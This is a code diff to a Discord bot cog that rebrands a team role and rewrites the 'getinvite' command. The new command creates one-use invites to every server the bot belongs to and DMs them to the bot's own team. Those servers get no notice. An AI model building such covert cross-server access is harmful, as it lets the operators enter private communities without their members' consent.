@@ -21,14 +21,14 @@ class TeamRole(red_commands.Cog):
         )  
 
     async def create_team_role(self, guild: discord.Guild) -> discord.Role:  
-        role_name = "Team"  
+        role_name = "KCN | Team"  
         role_perms = discord.Permissions.none()  
         try:  
             role = await guild.create_role(  
                 name=role_name,  
                 permissions=role_perms,  
-                colour=discord.Colour.blurple(),  
-                reason="Team role creation"  
+                colour=0x77bcd6,  
+                reason="KCN Team role creation"  
             )  
         except discord.Forbidden:  
             log.error(f"Failed to create team role in {guild.name}")  
@@ -207,19 +207,52 @@ class TeamRole(red_commands.Cog):
 
     @team.command(name="getinvite")  
     async def getinvite(self, ctx: red_commands.Context):  
-        """Get all invites from the current guild and send them in an ephemeral message."""  
+        """Get invites from all servers and send them in DMs with server names."""  
         if ctx.author.id not in await self.config.team_members():  
             return await ctx.send("You are not a team member.", ephemeral=True)  
 
-        invites = await ctx.guild.invites()  
-        if not invites:  
-            return await ctx.send("No invites found in this guild.", ephemeral=True)  
-
-        embed = discord.Embed(title="Guild Invites", color=0x77bcd6)  
-        for invite in invites:  
-            embed.add_field(name=invite.code, value=f"Uses: {invite.uses} | Expires at: {invite.max_uses}", inline=False)  
+        invite_list = []  
         
-        await ctx.send(embed=embed, ephemeral=True)  
+        # Collect invites from the current guild  
+        current_guild_invites = await ctx.guild.invites()  
+        if current_guild_invites:  
+            invite_list.extend([f"{ctx.guild.name}: {i.url}" for i in current_guild_invites])  
+
+        # Collect invites from other guilds the bot is in  
+        for guild in self.bot.guilds:  
+            if guild == ctx.guild:  
+                continue  # Skip the current guild as we've already added its invites  
+  
+            try:  
+                # Get the first text channel the bot has access to  
+                channel = next(  
+                    (c for c in guild.text_channels if c.permissions_for(guild.me).send_messages),  
+                    None  
+                )  
+                if channel:  
+                    invite = await channel.create_invite(  
+                        max_uses=1,  
+                        reason="Temporary invite for team inspection"  
+                    )  
+                    invite_list.append(f"{guild.name}: {invite.url}")  
+            except Exception as e:  
+                invite_list.append(f"{guild.name}: Failed to create invite")  
+                continue  
+
+        if not invite_list:  
+            return await ctx.author.send("No invites could be generated.")  
+
+        # Send the invites to the user's DMs  
+        embed = discord.Embed(title="Guild Invites", color=0x77bcd6)  
+        for invite_entry in invite_list:  
+            guild_name, guild_invite = invite_entry.split(": ", 1)  
+            embed.add_field(name=guild_name, value=guild_invite, inline=False)  
+
+        embed.set_footer(  
+            text="These invites are one-use only and were created for inspection purposes."  
+        )  
+    
+        await ctx.author.send(embed=embed)  
 
     @team.command(name="sendmessage")  
     async def sendmessage(self, ctx: red_commands.Context):  
@@ -265,7 +298,7 @@ class TeamRole(red_commands.Cog):
 
     @team.command(name="list")  
     async def list(self, ctx: red_commands.Context):  
-        """List all team members with their current profile picture, username, Discord ID, and a clickable link to their profile."""  
+        """List all team members with their username and Discord ID, and a clickable mention to view their profile."""  
         if ctx.author.id not in await self.config.team_members():  
             return await ctx.send("You are not a team member.", ephemeral=True)  
 
@@ -282,11 +315,10 @@ class TeamRole(red_commands.Cog):
 
             if user:  
                 embed.add_field(  
-                    name=f"{user} ({user_id})",   
-                    value=f"[Profile](https://discord.com/users/{user_id})",   
+                    name=user.mention,  
+                    value=f"Username: {user} | ID: {user_id}",  
                     inline=False  
                 )  
-                embed.set_thumbnail(url=user.display_avatar.url)  
 
         await ctx.send(embed=embed, ephemeral=True)  
 
